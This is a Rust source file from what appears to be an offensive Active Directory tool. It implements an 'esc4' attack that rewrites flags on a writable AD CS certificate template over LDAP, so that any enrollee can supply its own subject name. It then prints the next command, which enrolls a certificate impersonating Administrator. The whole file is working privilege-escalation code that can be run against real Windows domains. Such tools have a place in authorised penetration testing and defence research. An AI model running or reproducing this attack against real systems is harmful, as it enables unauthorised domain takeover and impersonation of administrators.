//! AD CS ESC4 — weaponize a writable certificate template. Flip the two flags
//! that make a template ESC1-vulnerable, so a later `attack esc1` finishes the
//! chain by enrolling a client-auth cert with a spoofed UPN SAN.

use anyhow::Result;
use clap::Parser;

#[derive(Parser)]
pub(crate) struct Esc4Args {
    #[arg(long)]
    pub url: String,
    #[arg(long)]
    pub user: String,
    #[arg(long, default_value = "")]
    pub password: adhammer_core::SecretString,
    #[arg(long)]
    pub insecure: bool,
    /// cn of the certificate template to weaponize (e.g. `User` or a custom one).
    #[arg(long)]
    pub template: String,
    /// Optional principal (sAMAccountName / SID) to grant Enroll on the template.
    /// Omit to leave the DACL untouched and only flip the flags.
    #[arg(long)]
    pub enrollee: Option<String>,
}

/// `attack esc4` — weaponize a certificate template we can write. Flip the two flags that make
/// a template ESC1-vulnerable: `msPKI-Certificate-Name-Flag |= ENROLLEE_SUPPLIES_SUBJECT`, and
/// `msPKI-Enrollment-Flag &= ~PEND_ALL_REQUESTS`. Optionally grant `--enrollee` an Enroll ACE.
/// After this runs, `attack esc1 --template <name> --alt-name Administrator` finishes the chain.
pub(crate) async fn esc4(mut a: Esc4Args) -> Result<()> {
    use adhammer_collector::{Collector, LdapConfig};
    const CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT: i64 = 0x0000_0001;
    const CT_FLAG_PEND_ALL_REQUESTS: i64 = 0x0000_0002;
    a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;

    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    let base = c.base_dn().to_string();
    let template_dn = format!(
        "CN={},CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{base}",
        a.template
    );

    // Read current flags, flip, write back. Replace-modify is safe because the values are
    // scalar u32-in-string form.
    let (name_flag, enroll_flag) = c.read_template_flags(&template_dn).await?;
    let new_name = name_flag | CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT;
    let new_enroll = enroll_flag & !CT_FLAG_PEND_ALL_REQUESTS;
    c.write_binary(
        &template_dn,
        "msPKI-Certificate-Name-Flag",
        new_name.to_string().into_bytes(),
    )
    .await?;
    c.write_binary(
        &template_dn,
        "msPKI-Enrollment-Flag",
        new_enroll.to_string().into_bytes(),
    )
    .await?;
    println!(
        "[+] {template_dn}: msPKI-Certificate-Name-Flag {name_flag}→{new_name} (SUPPLIES_SUBJECT), \
         msPKI-Enrollment-Flag {enroll_flag}→{new_enroll} (cleared PEND_ALL_REQUESTS)"
    );

    if let Some(enrollee) = &a.enrollee {
        eprintln!(
            "[!] --enrollee {enrollee}: Enroll-ACE write on template DACL not implemented \
                   yet — flags alone often suffice if the template is already broadly enrollable. \
                   Set the ACE manually or via `attack abuse` if needed."
        );
    }
    println!(
        "    → attack esc1 --template {} --alt-name Administrator",
        a.template
    );
    Ok(())
}
